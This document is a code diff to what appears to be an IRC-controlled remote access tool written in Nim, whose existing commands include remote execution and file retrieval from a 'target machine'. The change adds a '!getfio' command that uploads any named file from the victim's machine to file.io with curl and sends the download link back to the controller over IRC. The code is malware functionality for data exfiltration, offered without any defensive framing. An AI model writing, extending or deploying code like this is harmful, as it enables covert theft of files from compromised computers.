@@ -1,4 +1,4 @@
-import irc, strutils, osproc, os, zippy, base64, math, update_handler
+import irc, strutils, osproc, os, zippy, base64, math, update_handler, json
 
 let
     g_dbg* = true
@@ -92,6 +92,28 @@ proc rexec_changeDir(path:string):bool =
         return true
     else:
         return false
+
+
+
+
+
+## Uploads target file from target machine to file.io, sends link to controller
+proc cmd_getFileIO(event:IrcEvent, client:Irc, tokens:seq[string], force:bool) = 
+    var filename = helper_recombine(tokens,1)
+
+    if fileExists(filename):
+        var (output, _ ) = execCmdEx("curl -F  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
+
+        if output.contains("success\":true"):
+            var
+                json_data = parseJson(output)
+                download_link = json_data["link"].str 
+
+            client.privmsg(event.origin, "you have 1 hour: " & download_link)
+    else:
+        if g_dbg: echo "File missing"
+        client.privmsg(event.origin, "i dont see it")
+#      curl -F  "file=@./test.txt" "https://file.io?expires=1h"
 
 
 
@@ -246,6 +268,8 @@ proc cmdh_handle*(event:IrcEvent, client:Irc) =
         cmd_dxdiag(event, client)
     of "!r": #remote execution
         cmd_rexec(event, client, tokens)
+    of "!getfio":
+        cmd_getFileIO(event, client, tokens, false)
     of "!get":
         if tokens[high(tokens)] == "!":
             var ftokens = tokens
